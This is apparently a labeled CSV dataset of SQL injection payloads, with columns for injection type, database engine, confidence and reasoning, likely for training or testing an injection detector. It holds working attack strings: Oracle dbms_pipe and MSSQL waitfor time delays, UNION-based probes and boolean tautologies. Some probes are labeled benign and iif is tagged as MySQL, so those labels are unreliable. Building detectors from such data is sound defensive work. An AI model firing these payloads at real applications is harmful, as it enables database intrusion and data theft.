id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
25442,"1"" and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
25458,"1' ) where 7007 = 7007 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
25465,"1' and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and 'dubu' like 'dubu",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
25530,"1 ) ) as midl where 9046 = 9046 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
25409,"iif ( 1483 = 7301,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
25410,"1'|| ( select 'jonh' from dual where 2415 = 2415 union all select null,null,null,null,null,null,null,null,null--",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
25482,waitfor delay '0:0:5' and ( 4614 = 4614,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
25521,"1',iif ( 4861 = 6268,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 28 chars.,2
25524,"1'|| ( select 'dpce' from dual where 5261 = 5261 union all select null,null,null,null,null,null--",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
25532,1 where 9393 = 9393 waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
25597,-8080' ) ) order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 22 chars.,2
25401,"1"" ) ) as jikg where 8258 = 8258 and ( 3973 = 1047 ) *1047--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 60 chars.,2
25405,-4954' ) or 8571 = 8571--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
25408,"1' ) ) union all select null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,2
25417,"1"" ) ) as iqgd where 7611 = 7611 union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
